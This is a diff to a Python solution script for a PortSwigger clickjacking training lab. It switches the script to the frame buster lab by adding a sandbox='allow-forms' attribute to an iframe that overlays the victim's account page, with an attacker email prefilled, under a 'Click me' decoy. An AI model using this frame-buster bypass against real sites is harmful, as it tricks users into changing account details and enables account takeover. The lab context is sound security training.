@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# Clickjacking with form input data prefilled from a URL parameter
-# Lab-Link: https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
+# Clickjacking with a frame buster script
+# Lab-Link: https://portswigger.net/web-security/clickjacking/lab-frame-buster-script
 # Difficulty: APPRENTICE
 from bs4 import BeautifulSoup
 import requests
@@ -48,7 +48,7 @@ Content-Type: text/html; charset=utf-8''',
     <div id="evil_page">
     Click me!!!
     </div>
-    <iframe id="victim" src="''' + host + '''/my-account?email=mail@evil.me">
+    <iframe id="victim" sandbox="allow-forms" src="''' + host + '''/my-account?email=mail@evil.me">
     </iframe>
 </body>
 ''',
@@ -58,7 +58,7 @@ Content-Type: text/html; charset=utf-8''',
 
 
 def main():
-    print('[+] Clickjacking with form input data prefilled from a URL parameter')
+    print('[+] Clickjacking with a frame buster script')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
